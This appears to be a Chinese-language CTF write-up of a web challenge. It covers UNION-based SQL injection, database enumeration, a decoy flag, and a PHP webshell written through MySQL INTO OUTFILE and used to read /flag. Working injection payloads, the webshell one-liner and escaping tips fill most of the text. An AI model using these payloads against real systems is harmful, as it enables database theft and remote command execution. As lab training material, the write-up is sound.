---
date: 2026-11-20 16:15:00
slug: myctf-stellar-archive-sqli
categories:
  - SQL注入
  - Web
---

# 星辉魔女名鉴 — 库里没有 flag，那就写一个 shell 进去

> **题目类型**：SQL 注入 — `INTO OUTFILE` 写文件 getshell
>
> **Flag**：`MYCTF{9f2c7a41-6d3b-4e85-b0a7-1c8f4d2e6b93}`

---

## 题目概述

页面底部有个“终端”入口，进去是一块维护控制台。**提示是日语的，先翻译：**

```text
$ archive --status
[ ok ] 名鑑検索サービス: alive
[warn] 端末リリース 2.4.1 (legacy ・ 未統合フロント)

$ archive --storage
[info] エクスポート一時領域: /io/（書き込みは export 機能の実装後）
[info] 検索サービス本体は名鑑フロントから未接続
```

**翻译过来关键的就一行：**

```text
导出临时区域：/io/（写入需在 export 功能实现后）
```

**这句话等于提前告诉你：**`/io/` 目录可写**。**后面所有操作都是围着这一句展开的。**

---

## 解题过程

### Step 1：找注入点

**页面有个筛选框，输入 `rarity >= 3` 会返回一段 JSON，里面把拼好的 SQL 也打出来了：**

```text
SELECT id, name, title, rarity, element, sig FROM witches WHERE rarity >= 3 ORDER BY id ASC
```

**输一个单引号（`'`），报错——注入点确认。**

### Step 2：确定列数

**原查询是 6 个字段（id, name, title, rarity, element, sig），所以 UNION 也要 6 列：**

```sql
0 UNION SELECT 1,2,3,4,5,6
```

**能正常返回，说明列数对上了。**

### Step 3：爆库表列

```sql
6 UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),3,4,5,6 FROM INFORMATION_SCHEMA.TABLES-- -
```

```sql
6 UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME),3,4,5,6 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='archive_notes'-- -
```

**`-- -` 是注释掉后面原来的 `ORDER BY id ASC`（注意 `--` 后面必须有一个空格）。**

**扫出来的表里，与题目相关的就两张：`witches`（正常数据）和 `archive_notes`（看起来像隐藏内容）。**

### Step 4：库里的“flag”是假的

**读 `archive_notes`，看到这么一条：**

```text
封存样本（校验用，非本季名鉴凭证）：MYCTF{d3c0y_4rch1v3_n0t3_d0_n0t_submit}
```

**注意它自己写着 `d3c0y_..._d0_n0t_submit`——**这是**诱饵**，交上去就是错的。**

**这题的 flag 不在数据库里。**

### Step 5：看看能不能写文件

**既然提示说 `/io/` 可写，先确认数据库的写权限目录：**

```sql
6 UNION SELECT 1,@@secure_file_priv,3,4,5,6-- -
```

**返回：**

```text
/var/www/html/io/
```

**`@@secure_file_priv` 就是 MySQL/MariaDB 允许 `INTO OUTFILE` 写入的目录——和终端里那行提示**完全对上**了。**

**这说明出题人是故意把这条路留给你。**

### Step 6：写一个 webshell

```sql
rarity >= 6 UNION SELECT 1,'<?php system($_GET[0]);?>',3,4,5,6 INTO OUTFILE '/var/www/html/io/C.php'-- -
```

**几个必须注意的地方：**

```
① 路径用 @@secure_file_priv 给的那个，不能写别处
② INTO OUTFILE 不能覆盖已存在的文件（第一次写才成功，重写要换文件名）
③ 引号要小心：MySQL 写入时会把 " 转义成 \"，
   一旦变成 $_GET[\"cmd\"] 就是 PHP 语法错误 → 页面 500
④ 所以用 $_GET[0] 这种不带引号的写法最保险
```

**访问：**

```text
/io/C.php?0=cat%20/flag
```

**得到：**

```text
MYCTF{9f2c7a41-6d3b-4e85-b0a7-1c8f4d2e6b93}
```

---

| 关键点 | 说明 |
| --- | --- |
| 注入点 | 筛选条件 `rarity`，单引号报错确认 |
| 列数 | 原查询 6 列，UNION 也要 6 列 |
| 注释 | `-- -`（`--` 后必须空格），用来吃掉 `ORDER BY` |
| 提示的价值 | 终端已告知 `/io/` 可写 |
| 写权限目录 | `@@secure_file_priv` = `/var/www/html/io/`，与提示吻合 |
| 写 shell | `INTO OUTFILE` + `$_GET[0]`（避开引号转义） |
| 诱饵 | `archive_notes` 里的 `d3c0y_...` 是假的，别交 |

---

??? note "完整流程"

    ```sql
    -- ① 确认列数
    0 UNION SELECT 1,2,3,4,5,6

    -- ② 爆表
    6 UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),3,4,5,6 FROM INFORMATION_SCHEMA.TABLES-- -

    -- ③ 看写权限目录
    6 UNION SELECT 1,@@secure_file_priv,3,4,5,6-- -

    -- ④ 写 shell
    rarity >= 6 UNION SELECT 1,'<?php system($_GET[0]);?>',3,4,5,6 INTO OUTFILE '/var/www/html/io/C.php'-- -
    ```

    ```text
    访问：/io/C.php?0=cat /flag
    ```

??? note "这题踩的坑"

    **① `INFORMATION_SCHAME` 拼错**

    是 `INFORMATION_SCHEMA`。**拼错不会报注入失败，只会返回空——很容易误判成“表不存在”。**

    **② 忘了 `-- -` 注释**

    后面那句 `ORDER BY id ASC` 还在，UNION 的结果会被排序吞掉，看起来像“没插进去”。

    **③ 双引号被 MySQL 转义**

    `$_GET["cmd"]` 写进文件会变成 `$_GET[\"cmd\"]`，PHP 直接语法错误。**用 `$_GET[0]` 或 `$_GET[cmd]`。**

    **④ 反复往同一个文件名写**

    `INTO OUTFILE` 不允许覆盖已存在文件。**写失败就换个名字（C.php → D.php）。**

    **⑤ 交了诱饵 flag**

    `archive_notes` 里那条自己写着 `d0_n0t_submit`。**库里没有真 flag，必须有写文件这一步。**
